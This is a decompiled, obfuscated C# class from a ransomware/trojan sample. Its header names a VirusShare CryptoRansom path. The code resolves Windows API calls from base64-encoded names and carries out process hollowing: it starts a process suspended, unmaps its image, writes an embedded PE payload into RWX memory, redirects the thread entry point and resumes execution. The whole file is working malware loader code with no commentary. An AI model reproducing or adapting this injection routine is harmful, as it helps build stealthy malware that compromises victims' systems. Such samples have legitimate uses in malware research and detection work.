// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 124, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D363BA66-5C76-4B65-AF7B-757995FF6DB4
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-f95f379179baac3ddea23d429da263032c4ac506f5de7d0679a018f82e2a3343.exe

using \u0003;
using \u0005;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0005
{
  [StandardModule]
  internal sealed class \u0002
  {
    [DllImport("kernel32", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0002([MarshalAs(UnmanagedType.VBByRefStr)] ref string librarynameload);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr \u0002(IntPtr prochandleg, [MarshalAs(UnmanagedType.VBByRefStr)] ref string namegpa);

    public static T \u0002<T>(string name, string method) => (T) Marshal.GetDelegateForFunctionPointer(\u0002.\u0002(\u0002.\u0002(ref name), ref method), typeof (T));

    public static bool \u0002(byte[] xsuiqqwrqeniwbwnz, [In] string obj1)
    {
      \u0002.\u0001 obj2 = \u0002.\u0002<\u0002.\u0001>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82884))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82901))));
      \u0002.\u0007 obj3 = \u0002.\u0002<\u0002.\u0007>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82884))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82930))));
      \u0002.\u0003 obj4 = \u0002.\u0002<\u0002.\u0003>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82884))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82963))));
      \u0002.\u0004 obj5 = \u0002.\u0002<\u0002.\u0004>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82884))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82996))));
      \u0002.\u0002 obj6 = \u0002.\u0002<\u0002.\u0002>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82884))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(83025))));
      \u0002.\u0008 obj7 = \u0002.\u0002<\u0002.\u0008>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82884))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(83058))));
      \u0002.\u0006 obj8 = \u0002.\u0002<\u0002.\u0006>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(82884))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(83091))));
      \u0002.\u0005 obj9 = \u0002.\u0002<\u0002.\u0005>(Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(83116))), Encoding.UTF8.GetString(Convert.FromBase64String(\u0001.\u0002(83129))));
      bool flag;
      try
      {
        IntPtr zero1 = IntPtr.Zero;
        IntPtr[] numArray1 = new IntPtr[4];
        byte[] numArray2 = new byte[68];
        int int32_1 = BitConverter.ToInt32(xsuiqqwrqeniwbwnz, 60);
        int int16 = (int) BitConverter.ToInt16(xsuiqqwrqeniwbwnz, checked (int32_1 + 6));
        IntPtr num1 = new IntPtr(BitConverter.ToInt32(xsuiqqwrqeniwbwnz, checked (int32_1 + 84)));
        if (obj2((string) null, new StringBuilder(obj1), zero1, zero1, false, 4, zero1, (string) null, numArray2, numArray1))
        {
          uint[] numArray3 = new uint[179];
          numArray3[0] = 65538U;
          if (obj3(numArray1[1], numArray3))
          {
            IntPtr iesuuhchynegvvzlqz = new IntPtr(checked ((long) numArray3[41] + 8L));
            IntPtr zero2 = IntPtr.Zero;
            IntPtr kgvischhvgphidni = new IntPtr(4);
            IntPtr zero3 = IntPtr.Zero;
            if (obj4(numArray1[0], iesuuhchynegvvzlqz, ref zero2, (int) kgvischhvgphidni, ref zero3) && obj9(numArray1[0], zero2) == 0U)
            {
              IntPtr gwsrduhhhelsotxpp = new IntPtr(BitConverter.ToInt32(xsuiqqwrqeniwbwnz, checked (int32_1 + 52)));
              IntPtr wscnyxncgrtvlwsjy = new IntPtr(BitConverter.ToInt32(xsuiqqwrqeniwbwnz, checked (int32_1 + 80)));
              IntPtr num2 = obj5(numArray1[0], gwsrduhhhelsotxpp, wscnyxncgrtvlwsjy, 12288, 64);
              int int32_2 = num2.ToInt32();
              int num3;
              int num4 = obj6(numArray1[0], num2, xsuiqqwrqeniwbwnz, checked ((uint) (int) num1), num3) ? 1 : 0;
              int num5 = checked (int16 - 1);
              int num6 = 0;
              while (num6 <= num5)
              {
                int[] dst1 = new int[10];
                Buffer.BlockCopy((Array) xsuiqqwrqeniwbwnz, checked (int32_1 + 248 + num6 * 40), (Array) dst1, 0, 40);
                byte[] dst2 = new byte[checked (dst1[4] - 1 + 1)];
                Buffer.BlockCopy((Array) xsuiqqwrqeniwbwnz, dst1[5], (Array) dst2, 0, dst2.Length);
                wscnyxncgrtvlwsjy = new IntPtr(checked (int32_2 + dst1[3]));
                gwsrduhhhelsotxpp = new IntPtr(dst2.Length);
                int num7 = obj6(numArray1[0], wscnyxncgrtvlwsjy, dst2, checked ((uint) (int) gwsrduhhhelsotxpp), num3) ? 1 : 0;
                checked { ++num6; }
              }
              wscnyxncgrtvlwsjy = new IntPtr(checked ((long) numArray3[41] + 8L));
              gwsrduhhhelsotxpp = new IntPtr(4);
              int num8 = obj6(numArray1[0], wscnyxncgrtvlwsjy, BitConverter.GetBytes(num2.ToInt32()), checked ((uint) (int) gwsrduhhhelsotxpp), num3) ? 1 : 0;
              numArray3[44] = checked ((uint) (num2.ToInt32() + BitConverter.ToInt32(xsuiqqwrqeniwbwnz, int32_1 + 40)));
              int num9 = obj7(numArray1[1], numArray3) ? 1 : 0;
            }
          }
          int num10 = (int) obj8(numArray1[1]);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_11;
      }
      return true;
label_11:
      return flag;
    }

    public delegate bool \u0001(
      [In] string obj0,
      [In] StringBuilder obj1,
      [In] IntPtr obj2,
      [In] IntPtr obj3,
      [In] bool obj4,
      [In] int obj5,
      [In] IntPtr obj6,
      [In] string obj7,
      [In] byte[] obj8,
      [In] IntPtr[] obj9);

    public delegate bool \u0002([In] IntPtr obj0, [In] IntPtr obj1, [In] byte[] obj2, [In] uint obj3, [In] int obj4);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0003(
      IntPtr hpjvxhftkugsddeoaxrv,
      IntPtr iesuuhchynegvvzlqz,
      ref IntPtr aanqiibdlcdgsyaiuthg,
      int kgvischhvgphidni,
      ref IntPtr tnieryiajydgnfah);

    public delegate IntPtr \u0004(
      IntPtr ptxvzenhfiyxjrukuiaa,
      IntPtr gwsrduhhhelsotxpp,
      IntPtr wscnyxncgrtvlwsjy,
      int oykcpqvtqoonaicn,
      int bsgijtjjdskoknjpk);

    public delegate uint \u0005(IntPtr pchcqqapnkhkylpkukd, IntPtr pbqsnhkivlaqctbphk);

    public delegate uint \u0006(IntPtr lcelxaicxuenriantqju);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0007(IntPtr roayflzfrbzsjwfviu, uint[] gxhyqcduubsjikzqk);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool \u0008(IntPtr fxhcxwrwbwnndyrzoofq, uint[] idtsddwgyflpctwdc);
  }
}
